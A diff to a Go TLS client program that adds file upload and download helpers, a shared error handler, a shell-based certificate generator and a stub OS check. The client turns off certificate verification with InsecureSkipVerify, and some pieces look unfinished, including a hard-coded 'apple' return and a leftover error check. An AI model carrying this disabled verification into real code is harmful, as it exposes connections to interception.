@@ -5,20 +5,55 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"fmt"
+	"io"
 	"log"
-	"os/exec"
 	"os"
+	"os/exec"
+	"runtime"
 	"strings"
 )
 
 
+func handleError(err error){
+	if err != nil {
+		log.Fatal(err)
+	}
+}
+
+func uploadFile( conn *tls.Conn,path string) {
+	// open file to upload
+	fi, err := os.Open(path)
+	handleError(err)
+	defer fi.Close()
+	// upload
+	_, err = io.Copy(conn, fi)
+	handleError(err)
+}
+
+func downloadFile(conn *tls.Conn,path string) {
+	// create new file to hold response
+	fo, err := os.Create(path)
+	handleError(err)
+	defer fo.Close()
+
+	
+	handleError(err)
+	defer conn.Close()
+
+	_, err = io.Copy(fo, conn)
+	handleError(err)
+}
+
 func genCert(email string) string {
     cmd, err := exec.Command("/bin/sh", "../certGen.sh", email).Output()
-    if err != nil {
-    fmt.Printf("Error generating SSL Certificate: %s", err)
-    }
+    handleError(err)
     outstr := string(cmd)
     return outstr
+}
+func getOS(conn *tls.Conn) string{
+	 
+	return "apple"
+
 }
 
 func main() {
@@ -29,14 +64,14 @@ func main() {
 	}
 
 	cert, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")
-	if err != nil {
-		log.Fatalf("SSL Key Error: %s", err)
-	}
+
+	handleError(err)
 	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
 	conn, err := tls.Dial("tcp", arguments[1], &config)
-	if err != nil {
-		log.Fatalf("Client Dial Error: %s", err)
-	}
+
+
+	handleError(err)
+	
 	defer conn.Close()
 	log.Println("Client Connected to: ", conn.RemoteAddr())
 
